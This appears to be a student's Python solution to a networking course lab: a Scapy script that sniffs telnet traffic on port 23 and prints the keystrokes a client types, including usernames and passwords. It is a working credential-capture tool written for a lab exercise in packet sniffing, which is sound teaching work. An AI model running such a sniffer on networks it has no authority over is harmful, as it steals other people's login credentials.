#!/usr/bin/env python3
# ==============================================================================
# File Name:     telnet_sniffer.py
# Author:        Eva Tate and Giselle Wu
# Course:        CS60: Computer Networks
# Assignment:    Lab 1: Packet sniffing and spoofing
# Date:          September 29, 2026
#
# Description:   Implements the telnet password sniffer described in
#                Lab 1, Exercise 3.
#
# ==============================================================================

"""Telnet keystroke sniffer using Scapy.

Sniffs TCP port 23 and prints each keystroke once as it's typed (username,
password, commands), skipping the server's echo so nothing prints twice.

Usage: sudo python3 telnet_sniffer.py [interface]
"""

import sys

from scapy.layers.inet import TCP
from scapy.packet import Raw
from scapy.sendrecv import sniff

TELNET_PORT = 23
TELNET_IAC = 0xFF  # start of telnet option negotiation
PRINTABLE = set(range(0x20, 0x7F))  # visible ASCII; CR/LF handled below

# Enter comes across as CR then a NUL or LF. Track whether the last byte was
# CR so we can swallow the pair byte instead of printing a second newline.
_after_cr = False


def handle_packet(pkt):
    global _after_cr

    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    # Only client -> server (dport 23) is what the user typed. The reverse
    # direction is the server echoing it back, so skip it to avoid doubles.
    if pkt[TCP].dport != TELNET_PORT:
        return

    data = pkt[Raw].load

    # Skip option-negotiation packets. The option text can be printble too,
    # so drop the whole packet if there's an IAC byte anywhere in it.
    if TELNET_IAC in data:
        return

    for byte in data:
        if _after_cr and byte in (0x00, 0x0A):
            _after_cr = False  # pair byte after CR, already printed the newline
            continue
        _after_cr = False

        if byte == 0x0D:
            # print a real newline for CR, otherwise the next line just
            # overwrites this one on screen (password over username)
            sys.stdout.write("\n")
            _after_cr = True
        elif byte == 0x0A:
            sys.stdout.write("\n")
        elif byte in PRINTABLE:
            sys.stdout.write(chr(byte))
    sys.stdout.flush()


def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else None
    print(f"Sniffing telnet traffic on {iface or 'default interface'} (Ctrl+C to stop)...")
    sniff(filter=f"tcp port {TELNET_PORT}", iface=iface, prn=handle_packet, store=False)


if __name__ == "__main__":
    main()
